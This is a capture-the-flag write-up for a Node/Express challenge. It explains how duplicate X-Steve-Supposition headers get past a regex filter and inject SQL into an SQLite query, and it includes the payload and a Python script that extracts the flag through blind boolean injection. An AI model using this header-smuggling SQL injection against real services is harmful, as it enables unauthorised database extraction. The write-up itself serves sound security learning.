#SQL Injection via HTTP Header Concatenation

- The Node/Express application featured a /deviner (guess) endpoint. This endpoint takes the value of the X-Steve-Supposition HTTP header and uses it directly in an SQLite query, making it vulnerable to injection
`SELECT * FROM flag WHERE value = '${req.get("x-steve-supposition")}'.`
-  A middleware runs checks on the request headers using req.rawHeaders. It specifically validates the X-Steve-Supposition header against a strict regex that only allows alphanumeric and specific bracket characters, preventing standard injection characters like quotes or parentheses.
-  RFC 9110 allows multiple headers with the same name to have its values concatenated by commas.
-  The middleware iterates through req.rawHeaders and checks each raw header entry against the regex. Crucially, the sources note that Node's req.get() (used in the final SQL query) concatenates duplicate headers using a comma and space (, ), following RFC 9110. The middleware, however, only validates the last raw value supplied for the header.

Exploitation:

Attacker sends two X-Steve-Supposition headers

1. The first header contains the payload (x'or substr(value,1,1)='u'--).
2. The second header contains a clean, regex-passing value (x2). The second value passes the middleware's validation, but the final value passed to the SQL query (req.get()) is the concatenated string: x'or substr(value,1,1)='u'--, x2. This closes the initial single quote and executes the injection.

Since the application only returned "You have reason!" (Tu as raison!) or "You are wrong." (Bah, tu as tort.), a blind Boolean-based SQL injection was performed using substr() to brute-force the flag character by character

Solve script:
```py
import socket
import time
import ssl

CHARSET = "umdctf{abeghijklnopqrsvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}" 

host = 'localhost'
port = 3000

host = 'steve-le-poisson-api.challs.umdctf.io'
port = 443


def brute_position(n):
    """
    Realiza um brute-force no primeiro valor de X-Steve-Supposition
    até encontrar a resposta "You are right!".
    """


    for char in CHARSET:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.create_default_context()

        secure_socket = context.wrap_socket(client_socket, server_hostname=host)
        # secure_socket = client_socket

        secure_socket.connect((host, port))
        print(f"...{n}")

        request = b"GET /deviner HTTP/1.1\r\n"
        request += b"Host: steve-le-poisson-api.challs.umdctf.io\r\n"
        request += f"X-Steve-Supposition: 'or substr(value,{n},1)='{char}'--\r\n".encode('utf-8')
        request += b"X-Steve-Supposition: 2\r\n"
        request += b"User-Agent: MeuClienteHTTP/1.0\r\n"
        request += b"Accept: */*\r\n"
        request += b"Connection: close\r\n"
        request += b"\r\n"

        secure_socket.sendall(request)

        resposta = b""
        while True:
            parte = secure_socket.recv(4096)
            if not parte:
                break
            resposta += parte

        resposta_str = resposta.decode('utf-8')

        if "Tu as raison!" in resposta_str:
            print(f"\nCaractere correto encontrado para a posição {n}: '{char}'")
            secure_socket.close()
            return char

        time.sleep(0.01)

        if 'cliente_socket' in locals() and secure_socket is not None:
            secure_socket.close()

    print("\nNão foi possível encontrar o caractere correto dentro da lista de possibilidades.")

if __name__ == "__main__":
    flag = ''
    pos = 1
    found = brute_position(pos)
    flag += found
    while found != '}':
        pos += 1
        found = brute_position(pos)
        flag += found
        print(flag)

    print(f'Found: {flag}')
```